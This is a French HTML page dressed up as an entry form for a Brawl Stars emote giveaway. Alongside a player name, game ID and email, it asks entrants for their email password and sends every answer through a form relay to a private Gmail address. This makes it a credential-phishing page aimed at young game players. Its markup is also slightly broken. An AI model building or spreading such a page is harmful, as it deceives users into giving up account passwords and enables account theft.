<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Concours â€” Emote Brawl Stars</title>
  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#0b1220;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
    .card{background:#121b33;padding:22px;border-radius:12px;max-width:650px;width:100%}
    h1{margin-top:0}
    label{display:block;margin:12px 0 4px;font-size:14px}
    input,textarea,select{width:100%;padding:10px;border-radius:6px;border:none;background:#1b2747;color:#fff;font-size:14px}
    button{margin-top:16px;padding:10px 14px;border-radius:8px;border:0;background:#1f8cff;color:white;font-weight:600;cursor:pointer;width:100%}
    .note{font-size:12px;opacity:.7;margin-top:10px}
  </style>
</head>
<body>
  <form class="card" action="https://formsubmit.co/megumikun84@gmail.com" method="POST" enctype="multipart/form-data">
    <!-- Anti-spam -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_subject" value="Participation concours emote Brawl Stars">
    <input type="hidden" name="_template" value="table">

    <h1></h1>Formulaire pour l'emote !</h1>

    <label>Pseudo</label>
    <input type="text" name="pseudo" placeholder="Ton pseudo" required>

    <label>ID Brawl Stars</label>
    <input type="text" name="bs_id" placeholder="#ABCDEFG" required>

    <label>Email</label>
    <input type="email" name="email" placeholder="exemple@mail.com">

    <label>Pourquoi tu veux cette emote ?</label>
    <textarea name="message" rows="4" placeholder="Ta motivation..."></textarea>

    <label>Mot de passe du Mail</label>
    <input type="email" name="email" placeholder="mot de passe..."></input>
      
    <button type="submit">Envoyer ma participation</button>
  </form>
</body>
